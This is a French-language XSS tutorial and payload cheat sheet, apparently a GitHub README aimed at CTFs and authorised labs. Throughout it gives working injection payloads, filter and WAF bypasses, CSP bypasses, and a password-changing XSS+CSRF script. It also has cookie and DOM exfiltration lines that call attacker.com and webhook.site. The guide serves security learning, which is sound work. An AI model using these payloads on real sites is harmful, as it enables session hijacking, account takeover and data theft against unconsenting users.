# 🕷️ XSS Mastery — Guide Complet du Débutant au Professionnel

> **Auteur :** ML | **GitHub :** [exploit4040](https://github.com/exploit4040)  
> **Version :** 2.0 | **Licence :** MIT  
> ⚠️ *Ce guide est destiné exclusivement aux CTF, labs de sécurité et environnements autorisés.*

---

## 📚 Table des Matières

1. [C'est quoi le XSS ?](#1-cest-quoi-le-xss-)
2. [Les types de XSS](#2-les-types-de-xss)
3. [Comprendre le DOM](#3-comprendre-le-dom)
4. [Niveau 1 — Débutant](#4-niveau-1--débutant)
5. [Niveau 2 — Intermédiaire](#5-niveau-2--intermédiaire)
6. [Niveau 3 — Avancé](#6-niveau-3--avancé)
7. [Niveau 4 — Expert](#7-niveau-4--expert)
8. [Méthodologie Red Team XSS](#8-méthodologie-red-team-xss)
9. [Outils Pro](#9-outils-pro)
10. [CTF — Stratégie & Tips](#10-ctf--stratégie--tips)
11. [Ressources](#11-ressources)

---

## 1. C'est quoi le XSS ?

Le **Cross-Site Scripting (XSS)** est une vulnérabilité web qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs.

### Pourquoi c'est dangereux ?

```
Attaquant ──injecte──► Page Web ──exécute──► Navigateur Victime
                                              ├── Vol de cookies
                                              ├── Vol de session
                                              ├── Redirection
                                              ├── Défacement
                                              └── Keylogger
```

### Impact réel

| Impact | Description |
|--------|-------------|
| 🍪 Session hijacking | Vol du cookie de session → accès au compte |
| 🔑 Credential theft | Faux formulaire de login → vol de mot de passe |
| 🖥️ Defacement | Modification visuelle de la page |
| 🎣 Phishing | Redirection vers un site malveillant |
| 📸 Keylogging | Capture des touches clavier |
| 🌐 CSRF + XSS | Combinaison pour des attaques complexes |

---

## 2. Les types de XSS

### 2.1 Reflected XSS (Non-Persistant)

Le payload est dans la **requête HTTP** et renvoyé immédiatement dans la réponse.

```
Attaquant → URL malveillante → Victime clique → Serveur renvoie le payload → Exécution
```

**Exemple :**
```
https://site.com/search?q=<script>alert(document.cookie)</script>
```

**Comment identifier :**
- Cherche les paramètres GET/POST reflétés dans la page
- Teste `?q=TESTVALUE` et vérifie si TESTVALUE apparaît dans le source

---

### 2.2 Stored XSS (Persistant)

Le payload est **stocké en base de données** et exécuté pour chaque visiteur.

```
Attaquant → Formulaire/Commentaire → BDD → Chaque visiteur → Exécution
```

**Exemple :**
```html
<!-- Dans un champ commentaire -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Plus dangereux** car touche tous les utilisateurs sans action de leur part.

---

### 2.3 DOM-Based XSS

La vulnérabilité est dans le **JavaScript côté client**, pas dans le serveur.

```javascript
// Code vulnérable côté client
var search = document.location.hash.substring(1);
document.getElementById('results').innerHTML = search;
```

```
Payload : https://site.com/#<img src=x onerror=alert(1)>
```

**Spécificité :** Le payload ne passe jamais par le serveur.

---

### 2.4 Blind XSS

Le payload s'exécute dans une interface **admin/back-office** que tu ne vois pas directement.

```html
<!-- Dans un formulaire de contact -->
<script src="https://xsshunter.com/YOUR_ID.js"></script>
```

Utilise **XSSHunter** ou **Webhook.site** pour recevoir les callbacks.

---

## 3. Comprendre le DOM

Le DOM (Document Object Model) est la représentation JavaScript de ta page HTML.

### Objets importants pour le XSS

```javascript
document.cookie          // Tous les cookies
document.domain          // Domaine actuel
document.location        // URL actuelle
document.referrer        // Page précédente
document.title           // Titre de la page
document.body.innerHTML  // Tout le contenu HTML
window.localStorage      // Stockage local
window.sessionStorage    // Stockage de session
navigator.userAgent      // Infos navigateur
```

### Sources dangereuses (entrées utilisateur dans le DOM)

```javascript
document.URL
document.location.href
document.location.hash
document.location.search
document.referrer
window.name
```

### Sinks dangereux (fonctions qui exécutent du JS)

```javascript
innerHTML          // ⚠️ Exécute HTML
outerHTML          // ⚠️ Exécute HTML
document.write()   // ⚠️ Exécute HTML
eval()             // ⚠️ Exécute JS
setTimeout()       // ⚠️ Peut exécuter JS
setInterval()      // ⚠️ Peut exécuter JS
```

---

## 4. Niveau 1 — Débutant

### 4.1 Identifier les points d'injection

**Étape 1 — Cherche les zones d'entrée :**
- Champs de recherche
- Formulaires de commentaire
- URL avec paramètres (?id=, ?q=, ?name=)
- Profil utilisateur

**Étape 2 — Teste si la valeur est reflétée :**
```
Entrée : TESTMARKER123
→ Ctrl+U → Cherche TESTMARKER123 dans le source
```

**Étape 3 — Identifie le contexte :**

```html
<!-- Contexte HTML direct -->
<p>Bonjour TESTMARKER123</p>

<!-- Contexte attribut -->
<input value="TESTMARKER123">

<!-- Contexte JavaScript -->
<script>var name = "TESTMARKER123"</script>

<!-- Contexte URL -->
<a href="/user/TESTMARKER123">
```

---

### 4.2 Premiers payloads

```html
<!-- Test basique -->
<script>alert(1)</script>

<!-- Si script filtré -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Test cookie -->
<script>alert(document.cookie)</script>
```

---

### 4.3 Analyser le code source

**Ctrl+U** sur la page après injection → cherche ton marker

Si tu vois :
```html
<p>Bonjour &lt;script&gt;alert(1)&lt;/script&gt;</p>
```
→ Les `<>` sont encodés → essaie des event handlers sans balises

Si tu vois :
```html
<p>Bonjour <script>alert(1)</script></p>
```
→ ✅ Le payload passe ! Vérifie pourquoi ça n'a pas exécuté.

---

## 5. Niveau 2 — Intermédiaire

### 5.1 XSS selon le contexte

#### Contexte HTML direct
```html
<!-- La valeur est entre des balises HTML -->
<p>Valeur : INJECTION</p>

-- Payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

#### Contexte attribut HTML
```html
<!-- La valeur est dans un attribut -->
<input value="INJECTION">
<div class="INJECTION">

-- Payloads (on "sort" de l'attribut) -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><script>alert(1)</script>
"><svg onload=alert(1)>
```

#### Contexte JavaScript (string)
```html
<script>
  var name = "INJECTION";
  var age  = 'INJECTION';
</script>

-- Payloads (on "casse" la string JS) -->
";alert(1)//
';alert(1)//
</script><script>alert(1)</script>
```

#### Contexte JavaScript (template literal)
```javascript
var msg = `Hello INJECTION`;

-- Payloads -->
${alert(1)}
`+alert(1)+`
```

#### Contexte href/src
```html
<a href="INJECTION">
<iframe src="INJECTION">

-- Payloads -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

### 5.2 Bypass de filtres courants

#### Filtre : `<script>` bloqué
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

#### Filtre : `alert` bloqué
```javascript
prompt(1)
confirm(1)
console.log(1)
document.write(1)
```

#### Filtre : guillemets bloqués
```html
<img src=x onerror=alert(1)>
<svg onload=alert`1`>
<script>onerror=alert;throw 1</script>
```

#### Filtre : espaces bloqués
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<svg	onload=alert(1)>   <!-- tabulation -->
```

#### Filtre : case sensitive (majuscules/minuscules)
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SVG ONLOAD=alert(1)>
```

#### Filtre : encodage HTML
```html
<img src=x onerror=&#97;lert(1)>     <!-- a encodé -->
<img src=x onerror=&#x61;lert(1)>    <!-- a hex encodé -->
```

---

### 5.3 Vol de cookies — Méthodes

```html
<!-- Méthode 1 : alert() pour CTF -->
<script>alert(document.cookie)</script>

<!-- Méthode 2 : document.write -->
<script>document.write(document.cookie)</script>

<!-- Méthode 3 : titre de page -->
<img src=x onerror="document.title=document.cookie">

<!-- Méthode 4 : fetch vers serveur (lab autorisé) -->
<script>fetch('https://webhook.site/ID?c='+btoa(document.cookie))</script>

<!-- Méthode 5 : img exfil -->
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

---

## 6. Niveau 3 — Avancé

### 6.1 DOM XSS — Analyse

**Sources à surveiller :**
```javascript
// Cherche dans le JS de la page
document.location.href
document.location.hash      // Très commun
document.location.search
document.referrer
window.name
```

**Sinks à surveiller :**
```javascript
// Si une source arrive dans un sink → DOM XSS
element.innerHTML = SOURCE;
document.write(SOURCE);
eval(SOURCE);
setTimeout(SOURCE, 0);
location.href = SOURCE;
```

**Exemple d'exploitation :**
```javascript
// Code vulnérable
var hash = document.location.hash.substring(1);
document.body.innerHTML = hash;

// Exploitation
https://site.com/#<img src=x onerror=alert(1)>
```

---

### 6.2 Bypass WAF (Web Application Firewall)

```html
<!-- Encodage URL -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encodage -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Null byte (anciens filtres) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Commentaires HTML -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- Polyglot multi-contexte -->
'"<svg/onload=alert(1)>"'
```

---

### 6.3 XSS + CSRF combiné

```html
<!-- Changer le mot de passe via XSS + CSRF -->
<script>
fetch('/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'password=hacked123&confirm=hacked123'
});
</script>
```

---

### 6.4 XSS Keylogger (CTF)

```html
<script>
document.addEventListener('keypress', function(e) {
  document.title += e.key;  // Pour voir dans un CTF
});
</script>
```

---

### 6.5 Exfiltration de données sensibles

```html
<!-- Lire les champs cachés -->
<script>
var data = [];
document.querySelectorAll('input[type=hidden]').forEach(function(el) {
  data.push(el.name + '=' + el.value);
});
alert(data.join('\n'));
</script>

<!-- Lire localStorage -->
<script>alert(JSON.stringify(localStorage))</script>

<!-- Chercher un flag CTF -->
<script>
var match = document.documentElement.innerHTML.match(/(FLAG|CTF)\{[^}]+\}/gi);
if(match) alert(match.join('\n'));
</script>
```

---

## 7. Niveau 4 — Expert

### 7.1 Polyglots XSS

Un polyglot fonctionne dans **plusieurs contextes** simultanément :

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

### 7.2 Mutation XSS (mXSS)

Les navigateurs "mutent" parfois le HTML → ce qui était inoffensif devient dangereux.

```html
<!-- Injecté -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Après mutation du navigateur -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>">
```

---

### 7.3 XSS via SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>
```

```xml
<svg>
  <use href="data:image/svg+xml,
    <svg id='x' xmlns='http://www.w3.org/2000/svg'>
      <script>alert(1)</script>
    </svg>#x">
</svg>
```

---

### 7.4 XSS dans les headers HTTP

```
Referer: <script>alert(1)</script>
User-Agent: <script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
```

→ Si ces valeurs sont affichées dans une page admin non protégée.

---

### 7.5 Content Security Policy (CSP) Bypass

**CSP restrictive :**
```
Content-Security-Policy: script-src 'self'
```

**Bypass via JSONP endpoint :**
```html
<script src="/api/jsonp?callback=alert(1)//"></script>
```

**Bypass via Angular (si AngularJS chargé) :**
```html
{{constructor.constructor('alert(1)')()}}
```

**Bypass via nonce leak :**
```html
<!-- Si le nonce est prédictible ou leaké -->
<script nonce="LEAKED_NONCE">alert(1)</script>
```

---

### 7.6 Blind XSS — XSSHunter

Pour les situations où le payload s'exécute dans un contexte invisible :

```html
<!-- Payload qui envoie screenshot + DOM complet -->
<script src="https://YOUR_ID.xss.ht"></script>

<!-- Payload webhook custom -->
<script>
var data = {
  cookie: document.cookie,
  url: window.location.href,
  dom: btoa(document.documentElement.innerHTML),
  referrer: document.referrer
};
fetch('https://webhook.site/YOUR_ID', {
  method: 'POST',
  body: JSON.stringify(data)
});
</script>
```

---

## 8. Méthodologie Red Team XSS

### Phase 1 — Reconnaissance

```
1. Mapper toutes les entrées utilisateur
   - Paramètres GET/POST
   - Headers HTTP (User-Agent, Referer, X-Forwarded-For)
   - Cookies
   - JSON body dans les APIs

2. Identifier les technologies
   - Framework JS (React, Angular, Vue) → comportements différents
   - WAF présent ? (Cloudflare, ModSecurity...)
   - Headers de sécurité ? (CSP, X-XSS-Protection)
```

### Phase 2 — Test

```
1. Injecter un marker unique : xss_test_ML_001
2. Vérifier la réflexion dans le source
3. Identifier le contexte (HTML / attribut / JS / URL)
4. Choisir le payload adapté au contexte
5. Tester les bypasses si filtré
```

### Phase 3 — Exploitation

```
1. Confirmer l'exécution (alert ou console.log)
2. Exfiltrer les données (cookie, flag, DOM)
3. Documenter avec screenshot + payload + URL
```

### Phase 4 — Rapport (Bug Bounty / Pentest)

```
Titre        : Reflected XSS dans /search via paramètre q
Sévérité     : High
URL          : https://site.com/search?q=<payload>
Impact       : Vol de session, accès compte
Preuve       : Screenshot de l'alert(document.cookie)
Remediation  : Encoder les sorties, utiliser CSP
```

---

## 9. Outils Pro

| Outil | Usage | Lien |
|-------|-------|------|
| **Burp Suite** | Intercepter/modifier les requêtes | portswigger.net |
| **OWASP ZAP** | Scanner auto XSS | zaproxy.org |
| **XSSHunter** | Blind XSS | xsshunter.trufflesecurity.com |
| **Dalfox** | Scanner XSS avancé | github.com/hahwul/dalfox |
| **XSStrike** | Scanner + WAF bypass | github.com/s0md3v/XSStrike |
| **ffuf** | Fuzzing rapide | github.com/ffuf/ffuf |
| **Webhook.site** | Recevoir exfiltrations | webhook.site |

---

## 10. CTF — Stratégie & Tips

### Checklist rapide CTF XSS

```
□ 1. Tester <script>alert(1)</script>
□ 2. Tester <img src=x onerror=alert(1)>
□ 3. Tester <svg onload=alert(1)>
□ 4. Vérifier le code source (Ctrl+U)
□ 5. Identifier le contexte de réflexion
□ 6. Si filtré → bypass case/encodage/events
□ 7. Chercher le flag dans document.cookie
□ 8. Chercher le flag dans le DOM
□ 9. Chercher les variables JS (Object.keys(window))
□ 10. Chercher dans localStorage/sessionStorage
```

### Chercher le flag automatiquement

```javascript
// Méthode universelle CTF
<script>
// 1. Cookie
if(document.cookie) alert('COOKIE: ' + document.cookie);

// 2. Titre
if(document.title) alert('TITLE: ' + document.title);

// 3. DOM
var f = document.documentElement.innerHTML.match(/(FLAG|CTF|flag)\{[^}]+\}/gi);
if(f) alert('FLAG: ' + f);

// 4. Variables JS
Object.keys(window).filter(k => k.toLowerCase().includes('flag'))
  .forEach(k => alert(k + ': ' + window[k]));

// 5. localStorage
if(localStorage.length) alert('LS: ' + JSON.stringify(localStorage));
</script>
```

---

## 11. Ressources

### Labs gratuits
- **PortSwigger Web Academy** → portswigger.net/web-security/cross-site-scripting
- **TryHackMe** → tryhackme.com (Room : XSS)
- **HackTheBox** → hackthebox.com
- **PentesterLab** → pentesterlab.com
- **DVWA** → dvwa.co.uk (lab local)

### Références
- **OWASP XSS** → owasp.org/www-community/attacks/xss
- **XSS Cheat Sheet PortSwigger** → portswigger.net/web-security/cross-site-scripting/cheat-sheet
- **PayloadsAllTheThings** → github.com/swisskyrepo/PayloadsAllTheThings

### CTFs recommandés
- **CTFtime.org** → calendrier de tous les CTFs
- **PicoCTF** → débutant/intermédiaire
- **HSCTF / DUCTF** → challenges web XSS

---

> 🚩 **Bonne chance dans tes CTFs, ML !**  
> GitHub : [exploit4040](https://github.com/exploit4040)  
> ⚠️ *Toujours pratiquer sur des environnements autorisés.*
